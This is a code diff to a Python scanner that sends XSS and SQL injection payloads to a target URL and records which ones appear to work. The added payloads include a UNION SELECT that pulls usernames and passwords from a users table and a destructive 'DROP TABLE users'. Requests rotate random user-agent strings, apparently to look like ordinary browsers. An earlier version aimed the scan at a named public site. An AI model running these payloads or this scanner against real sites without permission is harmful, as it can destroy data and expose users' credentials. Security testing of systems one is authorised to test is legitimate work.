@@ -7,6 +7,9 @@ import random
 import logging
 import colorama
 from colorama import Fore, Style
+from fake_useragent import UserAgent
+
+ua = UserAgent()
 
 colorama.init(autoreset=True)
 LOG_FORMAT = f"{Fore.BLUE}[%(asctime)s]{Style.RESET_ALL} %(levelname)s: %(message)s"
@@ -15,19 +18,6 @@ logging.basicConfig(
     level=logging.DEBUG,
     format=LOG_FORMAT
 )
-
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/102.0",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/537.36",
-    "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/537.36",
-    "Mozilla/5.0 (Android 11; Mobile; rv:102.0) Gecko/102.0 Firefox/102.0",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/116.0.1938.69",
-    "Mozilla/5.0 (Linux; U; Android 10; en-us; SM-N960U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:99.0) Gecko/20100101 Firefox/99.0",
-    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 12.3; en-US; rv:90.0) Gecko/20100101 Firefox/90.0"
-]
 
 PAYLOADS = [
     '<script>alert("XSS Attack")</script>',
@@ -54,9 +44,17 @@ PAYLOADS = [
     "%3Cscript%3Ealert(%27XSS%27)%3C/script%3E"  
 ]
 
+SQL_PAYLOADS = [
+    "' OR 1=1 --",
+    "' UNION SELECT null, username, password FROM users --",
+    "'; DROP TABLE users --",
+    '" OR "a"="a',
+    "'; SELECT * FROM information_schema.tables --"
+]
+
 def user_agent():
     return {
-        "User-Agent": random.choice(USER_AGENTS),
+        "User-Agent": ua.random,
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
         "Accept-Language": "en-US,en;q=0.5",
         "Connection": "keep-alive"
@@ -105,8 +103,28 @@ def check_xss(url):
                 file.write("Payloads: \n" + "\n".join(vulnerable) + "\n\n")
             logging.info(f"{Fore.GREEN}[+] Results saved to xss_results.txt{Style.RESET_ALL}")
 
-check_xss("https://monkeytype.com/")
+def check_sql_injection(url):
 
+    if not check_website(url):
+        return
+    vulnerable = []
+    
+    for payload in SQL_PAYLOADS:
+        encoded_payload = urllib.parse.quote(payload)
 
+        try:
+            response = requests.get(url, params={'id': encoded_payload}, headers=user_agent(), timeout=10)
 
+            error_patterns = ["SQL syntax", "Warning", "mysql_fetch", "mysqli", "PDOException"]
+            if any(error in response.text for error in error_patterns):
+                logging.info(f"{Fore.GREEN}[+] SQL Injection vulnerability found at {url} with payload: {payload}{Style.RESET_ALL}")
+                vulnerable.append(payload)
 
+        except RequestException as e:
+            logging.error(f"{Fore.RED}[!] Error during SQL Injection check on {url}: {e}{Style.RESET_ALL}")
+
+    if vulnerable:
+        with open("sql_injection_results.txt", "a") as file:
+            file.write(f"Vulnerable URL: {url}\n")
+            file.write("Payloads: \n" + "\n".join(vulnerable) + "\n\n")
+        logging.info(f"{Fore.GREEN}[+] Results saved to sql_injection_results.txt{Style.RESET_ALL}")
